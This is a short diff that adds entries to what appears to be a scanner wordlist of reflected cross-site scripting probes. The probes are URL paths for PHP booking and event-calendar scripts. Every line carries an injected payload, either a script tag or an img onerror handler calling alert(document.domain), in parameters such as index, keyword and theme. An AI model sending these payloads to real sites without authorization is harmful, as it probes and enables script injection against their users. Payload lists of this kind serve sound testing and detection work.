@@ -9,3 +9,5 @@
 /index.php?controller=pjFront&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 /index.php?controller=pjFrontPublic&action=pjActionSearch&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 /preview.php?controller=pjLoad&action=pjActionIndex&question_search=1&pjPage=1&column=created&direction=DESC&keyword=%22><script>alert(document.domain)</script>
+/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
+/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest
